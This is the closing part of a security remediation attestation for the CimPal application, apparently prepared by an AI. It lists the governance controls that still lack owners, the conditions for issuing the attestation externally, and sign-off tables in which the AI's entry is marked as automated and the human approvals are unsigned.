| 5 | **Secure code review of material changes**, mandatory for any change touching archive extraction, outbound requests, the remote-host allowlist, process execution, filesystem writes, CSV/report emission, or parser configuration. | `________` | Per change | Not formalised |
| 6 | **Dependency currency review**, including removal of end-of-life and pre-release artifacts. | `________` | Quarterly | Not formalised |
| 7 | **Vulnerability disclosure process** — a published contact and documented triage and remediation SLA by severity. The project currently directs reports to `cimpal@griddigit.eu` and GitHub issues; neither is a confidential channel for security reports. Adding `SECURITY.md` and GitHub private vulnerability reporting is recommended. | `________` | Continuous | Not published |
| 8 | **Human review of this attestation**, per §5.2(1). | `________` | Before external issue | Outstanding |
| 9 | **Re-attestation** upon material architectural change, and no less than annually. | `________` | Annual | Not scheduled |

### 5.4 Conditions for Issuing This Attestation Externally

This document may be issued to an auditor, customer or assessor once **all** of the
following hold:

- [x] Every finding in §4 carries a status of `Remediated & Verified`.
- [x] All factual fields in §2 are populated, including the reviewed commit SHA.
- [x] Remediations have been verified against the stated revision, not merely authored.
- [ ] A named accountable human has reviewed §4 and signed §6.
- [ ] `mvn -Psecurity-scan verify` has completed on a network-enabled runner with no
      unresolved High/Critical dependency advisories (§4.6 limitation).
- [ ] The modified interactive paths have passed a functional smoke test (§5.2(4)).
- [ ] Owners and cadences in §5.3 are populated.
- [ ] The AI-provenance banner at the head of this document is retained — it must **not** be
      removed, as it is material to a reader's assessment of the assurance offered.

---

## 6. Attestation and Sign-Off

The reviewer entry below records automated work. **The engineering-owner and approver
entries are unsigned**; this document is a self-attestation of completed remediation, not a
countersigned certificate, until a named human has reviewed §4 and signed.

| Role | Name | Signature | Date |
|---|---|---|---|
| Reviewer (automated) | Claude (Anthropic), model Opus 5 | *AI-generated — not a human signature* | 2026-09-06 |
| Engineering owner | `________________` | `________________` | `__________` |
| Accountable approver | `________________` | `________________` | `__________` |

**Document control**

| Field | Value |
|---|---|
| Document version | 1.0 |
| Prepared | 2026-09-06 |
| Prepared by | Claude (Anthropic), model Opus 5, via Claude Code in IntelliJ IDEA |
| Base revision | `b1585473eed70cceea3b0930e82232eed3f7e6a9` (branch `devel`) |
| Application version | CimPal 2026.9.05.1 |
| Supersedes | Draft 0.1 (2026-09-06) |
| Next review due | 2027-09-06, or upon material architectural change |
| Classification | `________________` |
